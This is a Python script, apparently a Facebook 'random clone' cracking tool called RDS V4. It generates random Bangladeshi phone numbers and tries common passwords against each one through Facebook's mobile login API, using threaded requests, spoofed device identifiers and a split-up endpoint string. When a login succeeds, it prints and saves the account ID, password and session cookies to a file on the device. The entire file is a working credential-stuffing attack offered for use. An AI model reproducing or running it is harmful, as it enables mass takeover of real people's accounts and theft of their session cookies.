import marshal
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('git pull')
    os.system('rm -rf SGBD')
    os.system('pip install bs4')
    os.system('pip install httpx')
    os.system('pip unistall requests')
    os.system('pip install requests')
    
#---------MISSING-MODIUL---------#
#-------COLOR-CODE------#
RED = '\033[1;91m'
GREEN = '\033[1;32m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
cokbrut=[]
ses=requests.Session()
uat = []
ugen = []
#--------USER-AGENTS------#
model = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.'])
gtt=random.choice(['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.3'])
sim = random.choice(['Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3'])
fb = random.choice(['com.facebook.katana','com.facebook.orca'])
fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
fbbv = str(random.randint(111111111,999999999))
one = random.choice(['GM1917','GM1913','GM1911','GM1910','GM1915'])
hi = random.choice(['CPH1851','CPH1609','CPH2385','CPH2365','CPH2061','CPH2373','CPH2125','CPH1879'])
samsung = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
lol = random.choice(['SM-J111F','WAS-LX1','WAS-LX3','G3112','SM-G885F','SM-A520F','SM-A260G','SM-A810F','SM-G388F','WAS-LX','SM-J720F','SM-G532G','SM-A6058','SM-G8858','PRA-LX3','PRA-LX2','X00ID','SM-J701F','WAS-L03T','SM-j105H'])
vivo = random.choice(['1718','1606','1807','1730','1725','1808','1714','2001A','1719','2002','1923A','1930'])
code = random.choice(['9871,9725,6353,9908'])
def tanim():
        END = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.30.91;FBBV/71608355;FBDM/{density=2.90,width=1080,height=2200};FBLC/en_GB;FBRV/844511408;FBCR/zong;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(lol)+';FBSV/10;FBOP/19;FBCA/armeabi v7a:armeabi;]'
        ua = 'Dalvik/2.1.0 (Linux; U; Android '+str(random.randrange(5,14))+'; '+str(model)+' Build/QP1A.'+str(random.randrange(111111,999999))+'.'+str(random.randrange(111,999))+') '+str(END)+''
        return ua
logo= ("""        
        \x1b[38;5;83m
██████╗░██████╗░░██████╗
██╔══██╗██╔══██╗██╔════╝
██████╔╝██║░░██║╚█████╗░
██╔══██╗██║░░██║░╚═══██╗
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░ [38;5;197m(V4)
\x1b[38;5;77m──────────────────────────────────────────────                 
\x1b[38;5;78m〘✧〙DEVLOPER  \x1b[38;5;222m➤  \x1b[38;5;78m RDS
\x1b[38;5;79m〘✧〙FACEBOOK  \x1b[38;5;222m➤  \x1b[38;5;79m RDS
\x1b[38;5;115m〘✧〙WHATSAPP  \x1b[38;5;222m➤   \x1b[38;5;115m+880
\x1b[38;5;78m〘✧〙TOOLS     \x1b[38;5;222m➤   \x1b[38;5;78mRANDOM CLONE    \x1b[38;5;197m(FREE)
\x1b[38;5;77m──────────────────────────────────────────────""")
def linex():
	print(f'\x1b[38;5;194m──────────────────────────────────────────────')
def main():
    os.system('clear');print(logo)
    print(f'\x1b[38;5;155m➤  [1] RANDOM CRACK ')
    print(f'\x1b[38;5;155m➤  [2] EXIT TOOLS ');linex()
    t=input('\x1b[38;5;155m[➤] YOUR CHOICE : ')
    if t in ["1","01"]:
        bhoot()    
    if t in ["2","02"]:
        os.system('exit')
    if t in ["E","e"]:
        os.system('exit')
   

def bhoot():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f'\x1b[38;5;155m[✧] SIM CODE : 9871,9725,6353,9908 ')
    code = input(f'\x1b[38;5;155m[➤] YOUR CHOICE : ');linex()
    os.system("clear")
    print(logo)
    print(f'\x1b[38;5;155m[✧] LIMIT EXAMPLE : 5000,10000,50000 ')
    limit = int(input('\x1b[38;5;155m[➤] YOUR CHOICE : '));linex()
    os.system("clear")
    print(logo)
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as TANIM:
        tl = str(len(user))
        print('\x1b[38;5;155m[➤] \x1b[38;5;222mUSE FLIGHT MOD AFTER 2 MINUTES GET MORE OK IDS <>~~~');linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','sadiya','mimmim','mababa','sarmin','riya123','yousha','sabbir','mehedi','tonmoy','ayesha','fuckyou','tammana','nishat']
            ids = code+love
            TANIM.submit(api,ids,pwx,tl)
    print('RDSOK \033[1;92m'+str(len(oks)))
    
def api(ids,pwv,tl):
    global loop,oks,cps,twf
    sys.stdout.write(f'\r\x1b[38;5;155m[➤] RDS~FINDING  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            cutta={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            bhootxx={'authority': 'mbasic.facebook.com',     
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Redmi Note 4"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"7.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)',
            'viewport-width': '980',}  
            po = requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=cutta,headers=bhootxx,allow_redirects=False).json()
            if 'access_token' in po:
                kuki = po["session_cookies"]
                cok = {}
                for x in kuki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\x1b[38;5;84m[RDS-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
                print('\033[1;92m[COOKIE] : ➤ : '+kuki+'\x1b[38;5;223m');linex()
                oks.append(ids)
                open('/sdcard/RDS-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
main()
